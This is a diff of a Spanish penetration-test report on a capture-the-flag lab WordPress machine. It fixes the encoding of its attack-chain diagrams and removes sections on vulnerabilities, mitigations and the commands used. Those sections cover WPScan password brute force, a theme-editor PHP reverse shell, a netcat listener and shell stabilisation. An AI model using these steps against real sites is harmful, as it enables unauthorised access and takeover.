@@ -211,129 +211,65 @@ id
 ## 8. CADENA DE ATAQUE COMPLETA
 
 ```
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ CADENA DE EXPLOTACIÓN â”‚
-â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
-â”‚ â”‚
-â”‚ [1] RECONOCIMIENTO â”‚
-â”‚ â”Œâ”€ Nmap â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
-â”‚ â”‚ Puertos: 22(SSH), 80(HTTP) â”‚
-â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
-â”‚ â”‚ â”‚
-â”‚ â–¼ â”‚
-â”‚ [2] ENUMERACIÓN WEB â”‚
-â”‚ â”Œâ”€ dirsearch -r â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ /wordpress (301) â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
-â”‚ â”‚ Fuzzing recursivo â”‚â”€â”€â”€â”€â–¶â”‚ Redirección a dominio â”‚ â”‚
-â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
-â”‚ â”‚ â”‚
-â”‚ â–¼ â”‚
-â”‚ [3] CONFIGURACIÓN DOMINIO â”‚
-â”‚ â”Œâ”€ /etc/hosts â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ academy.thehackerlabs â”€â”€â”€â”€â” â”‚
-â”‚ â”‚ IP → dominio â”‚â”€â”€â”€â”€â–¶â”‚ Resolución DNS local â”‚ â”‚
-â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
-â”‚ â”‚ â”‚
-â”‚ â–¼ â”‚
-â”‚ [4] ENUMERACIÓN CMS â”‚
-â”‚ â”Œâ”€ WPScan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ WordPress 6.5.3 â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
-â”‚ â”‚ Versión + plugins â”‚â”€â”€â”€â”€â–¶â”‚ Elementor detectado â”‚ â”‚
-â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
-â”‚ â”‚ â”‚
-â”‚ â–¼ â”‚
-â”‚ [5] CRACKING DE CREDENCIALES â”‚
-â”‚ â”Œâ”€ WPScan brute force â”€â”€â”€â” â”Œâ”€ Dylan / password1 â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
-â”‚ â”‚ rockyou.txt â”‚â”€â”€â”€â”€â–¶â”‚ Credenciales encontradas â”‚ â”‚
-â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
-â”‚ â”‚ â”‚
-â”‚ â–¼ â”‚
-â”‚ [6] ACCESO AL PANEL â”‚
-â”‚ â”Œâ”€ /wp-admin â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ Editor de temas â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
-â”‚ â”‚ Login con Dylan â”‚â”€â”€â”€â”€â–¶â”‚ 404.php → reverse shell â”‚ â”‚
-â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
-â”‚ â”‚ â”‚
-â”‚ â–¼ â”‚
-â”‚ [7] REVERSE SHELL â”‚
-â”‚ â”Œâ”€ nc -lvnp 1234 â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ www-data shell â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
-â”‚ â”‚ TCP connection â”‚â”€â”€â”€â”€â–¶â”‚ HTTP → TCP bypass WAF â”‚ â”‚
-â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
-â”‚ â”‚ â”‚
-â”‚ â–¼ â”‚
-â”‚ [8] ESTABILIZACIÓN â”‚
-â”‚ â”Œâ”€ python3 pty â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”Œâ”€ Shell estable â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
-â”‚ â”‚ TTY spawn â”‚â”€â”€â”€â”€â–¶â”‚ Acceso inicial logrado â”‚ â”‚
-â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
-â”‚ â”‚ â”‚
-â”‚ â–¼ â”‚
-â”‚ [9] ESTADO FINAL â”‚
-â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
-â”‚ â”‚ USER (www-data): Acceso logrado â”‚ â”‚
-â”‚ â”‚ ROOT: PENDIENTE (módulo de escalada) â”‚ â”‚
-â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
-â”‚ â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-```
-
----
-
-## 9. VULNERABILIDADES IDENTIFICADAS
-
-| # | Vulnerabilidad | Severidad | Ubicación | Impacto |
-|---|----------------|-----------|-----------|---------|
-| 1 | Fuerza bruta WordPress sin rate limiting | ALTA | `/wp-login.php` | Acceso al panel administrativo |
-| 2 | Contraseña débil (`password1`) | ALTA | Usuario Dylan | Cracking trivial con rockyou.txt |
-| 3 | Editor de temas sin restricción | CRÍTICA | `/wp-admin` → Editor de temas | RCE via reverse shell PHP |
-| 4 | Plantilla 404.php ejecuta PHP | ALTA | `/wordpress/404.php` | Vehículo para reverse shell |
-| 5 | WordPress 6.5.3 potencialmente vulnerable | MEDIA | Core de WordPress | Posibles CVEs conocidos |
-| 6 | WAF a nivel de aplicación (Wordfence) | BAJA | Plugin WordPress | Bypass via cambio de protocolo HTTP→TCP |
-
----
-
-## 10. RECOMENDACIONES DE MITIGACIÓN
-
-1. **Implementar rate limiting en wp-login.php** â€” Bloquear después de N intentos fallidos
-2. **Usar contraseñas fuertes** â€” Política de complejidad; `password1` es inaceptable
-3. **Restringir acceso al editor de temas** â€” Solo administradores con rol específico
-4. **Deshabilitar editor de temas en producción** â€” Añadir `define('DISALLOW_FILE_EDIT', true);` en `wp-config.php`
-5. **Mantener WordPress actualizado** â€” Actualizar core, plugins y temas regularmente
-6. **Implementar 2FA** â€” Autenticación de dos factores para wp-admin
-7. **Usar WAF externo** â€” Cloudflare, Sucuri o similar antes de WordPress
-8. **Monitorear logs de WordPress** â€” Alertar sobre intentos de login sospechosos
-9. **Implementar Content Security Policy** â€” Restringir scripts ejecutables
-10. **Auditar plugins periódicamente** â€” Eliminar plugins no utilizados (Elementor, etc.)
-
----
-
-## 11. COMANDOS CLAVE UTILIZADOS
-
-```bash
-# Reconocimiento
-sudo netdiscover -r 10.0.2.0/24
-sudo nmap -sV -p- IP_DE_LA_MAQUINA
-
-# Enumeración web
-dirsearch -u http://IP_DE_LA_MAQUINA/ -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-
-# Configuración dominio
-sudo nano /etc/hosts
-# IP_DE_LA_MAQUINA academy.thehackerlabs
-
-# Enumeración WordPress
-wpscan --url http://academy.thehackerlabs/wordpress
-wpscan --url http://academy.thehackerlabs/wordpress -e u
-wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap
-wpscan --url http://academy.thehackerlabs/wordpress --enumerate vp --api-token {API_TOKEN}
-
-# Brute force
-wpscan --url http://academy.thehackerlabs/wordpress --enumerate ap --passwords /usr/share/wordlists/rockyou.txt
-
-# Reverse shell
-nc -lvnp 1234
-# Visitar http://academy.thehackerlabs/wordpress/404.php
-
-# Estabilización
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-# Ctrl+Z
-stty raw -echo; fg
+┌──────────────────────────────────────────────────────────────┐
+│                   CADENA DE EXPLOTACIÓN                       │
+├──────────────────────────────────────────────────────────────┤
+│                                                              │
+│  [1] RECONOCIMIENTO                                          │
+│  ┌─ Nmap ──────────────────────┐                              │
+│  │ Puertos: 22(SSH), 80(HTTP)  │                              │
+│  └─────────────────────────────┘                              │
+│        │                                                     │
+│        ▼                                                     │
+│  [2] ENUMERACIÓN WEB                                         │
+│  ┌─ dirsearch -r ──────────────┐  ┌─ /wordpress (301) ──┐   │
+│  │ Fuzzing recursivo            │──│ Redirección dominio  │   │
+│  └──────────────────────────────┘  └────────────────────┘   │
+│        │                                                     │
+│        ▼                                                     │
+│  [3] CONFIGURACIÓN DOMINIO                                   │
+│  ┌─ /etc/hosts ─────────────────┐  ┌─ academy.thehackerlabs ┐│
+│  │ IP → dominio                  │──│ Resolución DNS local   ││
+│  └───────────────────────────────┘  └────────────────────────┘│
+│        │                                                     │
+│        ▼                                                     │
+│  [4] ENUMERACIÓN CMS                                         │
+│  ┌─ WPScan ─────────────────────┐  ┌─ WordPress 6.5.3 ────┐ │
+│  │ Versión + plugins             │──│ Elementor detectado   │ │
+│  └───────────────────────────────┘  └──────────────────────┘ │
+│        │                                                     │
+│        ▼                                                     │
+│  [5] CRACKING DE CREDENCIALES                                │
+│  ┌─ WPScan brute force ─────────┐  ┌─ Dylan / password1 ──┐ │
+│  │ rockyou.txt                   │──│ Credenciales halladas │ │
+│  └───────────────────────────────┘  └──────────────────────┘ │
+│        │                                                     │
+│        ▼                                                     │
+│  [6] ACCESO AL PANEL                                         │
+│  ┌─ /wp-admin ──────────────────┐  ┌─ Editor de temas ────┐ │
+│  │ Login con Dylan               │──│ 404.php → rev shell  │ │
+│  └───────────────────────────────┘  └──────────────────────┘ │
+│        │                                                     │
+│        ▼                                                     │
+│  [7] REVERSE SHELL                                           │
+│  ┌─ nc -lvnp 1234 ─────────────┐  ┌─ www-data shell ─────┐ │
+│  │ TCP connection                │──│ HTTP→TCP bypass WAF  │ │
+│  └───────────────────────────────┘  └──────────────────────┘ │
+│        │                                                     │
+│        ▼                                                     │
+│  [8] ESTABILIZACIÓN                                          │
+│  ┌─ python3 pty ────────────────┐  ┌─ Shell estable ──────┐ │
+│  │ TTY spawn                     │──│ Acceso inicial logrado│ │
+│  └───────────────────────────────┘  └──────────────────────┘ │
+│        │                                                     │
+│        ▼                                                     │
+│  [9] ESTADO FINAL                                            │
+│  ┌──────────────────────────────────────────────────────────┐│
+│  │ USER (www-data): Acceso logrado                           ││
+│  │ ROOT: PENDIENTE (módulo de escalada)                      ││
+│  └──────────────────────────────────────────────────────────┘│
+│                                                              │
+└──────────────────────────────────────────────────────────────┘
 ```
 
 ---
@@ -341,37 +277,31 @@ stty raw -echo; fg
 ## 12. EVIDENCIAS DE COMPROMISO
 
 ```
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ FLAGS OBTENIDAS â”‚
-â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
-â”‚ USER (www-data): Acceso logrado â”‚
-â”‚ ROOT: PENDIENTE (módulo de escalada) â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+┌──────────────────────────────────────────────────────────────┐
+│                       FLAGS OBTENIDAS                         │
+├──────────────────────────────────────────────────────────────┤
+│ USER (www-data): Acceso logrado                               │
+│ ROOT: PENDIENTE (módulo de escalada)                          │
+└──────────────────────────────────────────────────────────────┘
 
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ ACCESOS LOGRADOS â”‚
-â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
-â”‚ âœ“ WPScan → Enumeración de usuarios y plugins â”‚
-â”‚ âœ“ Brute force → Dylan / password1 â”‚
-â”‚ âœ“ Login wp-admin → Panel de administración â”‚
-â”‚ âœ“ Editor de temas → Reverse shell PHP en 404.php â”‚
-â”‚ âœ“ Shell www-data estabilizada con python3 pty â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+┌──────────────────────────────────────────────────────────────┐
+│                     ACCESOS LOGRADOS                          │
+├──────────────────────────────────────────────────────────────┤
+│ ✓ WPScan → Enumeración de usuarios y plugins                 │
+│ ✓ Brute force → Dylan / password1                            │
+│ ✓ Login wp-admin → Panel de administración                   │
+│ ✓ Editor de temas → Reverse shell PHP en 404.php             │
+│ ✓ Shell www-data estabilizada con python3 pty                 │
+└──────────────────────────────────────────────────────────────┘
 
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ NOTA â”‚
-â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
-â”‚ La escalada de privilegios a root NO fue completada â”‚
-â”‚ en esta sesión. Queda pendiente para un módulo posterior. â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+┌──────────────────────────────────────────────────────────────┐
+│                          NOTA                                 │
+├──────────────────────────────────────────────────────────────┤
+│ La escalada de privilegios a root NO fue completada           │
+│ en esta sesión. Queda pendiente para un módulo posterior.     │
+└──────────────────────────────────────────────────────────────┘
 ```
 
 ---
 
 **FIN DEL INFORME**
-
-→
-→
-
-→
-
